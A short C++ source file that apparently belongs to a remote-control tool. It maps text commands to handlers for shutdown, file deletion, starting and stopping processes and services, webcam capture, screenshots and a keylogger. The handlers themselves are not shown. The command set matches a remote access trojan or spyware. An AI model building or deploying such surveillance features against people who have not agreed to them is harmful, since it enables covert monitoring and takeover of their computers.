#include "services.h"

namespace Services {
    std::map<std::string, bool(*)(const std::string&)> servicesMap {
        {"system-shutdown",     &shutdown}, 
        {"system-restart",      &restart},
        {"file-list",           &listFileAndFolder},
        {"file-delete",         &deleteFile},
        {"application-list",    &listApplications},
        {"application-start",   &startApplication},
        {"application-stop",    &stopApplication},
        {"service-list",        &listServices},
        {"service-start",       &startService},
        {"service-stop",        &stopService},
        {"webcam-start",        &webcamCapture},
        {"screenshot",          &screenShot},
        {"keylogger",           &keyLogger}
    };
};

bool Services::processCommand(std::string &command) {
    int pos = command.find(' ');
    if (pos == command.npos) {
        return false;
    }

    std::string type = command.substr(0, pos);
    std::cout << "Type: " << type << '\n';

    // if (type == "file-copy") {
    //     int pos2 = command.find(' ', pos + 1);
    //     std::string pathSrc = command.substr(pos + 1, pos2 - pos - 1);
    //     std::string pathDes = command.substr(pos2 + 1, command.size() - pos2 - 1);
    //     return copyFile(pathSrc, pathDes);
    // }

    if (servicesMap.find(type) == servicesMap.end()) {
        return false;
    }

    std::string str = command.substr(pos + 1, command.size() - pos - 1);
    std::cout << "File: " << str << '\n';
    return servicesMap[type](str);
}